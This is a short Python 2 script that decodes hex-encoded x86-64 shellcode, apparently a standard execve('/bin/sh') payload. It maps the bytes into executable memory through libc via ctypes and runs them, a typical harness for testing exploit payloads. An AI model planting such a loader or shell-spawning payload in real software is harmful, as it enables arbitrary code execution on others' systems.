#!/usr/bin/python
shellcode = '6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05'.decode(
    'hex')
from ctypes import *
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
mmap = libc.mmap
mmap.restype = c_void_p
executable = mmap(0, 0x1000, 7, 98, -1, 0)
libc.memcpy(executable, shellcode, len(shellcode))
libc.__libc_start_main(executable, executable, executable, executable)
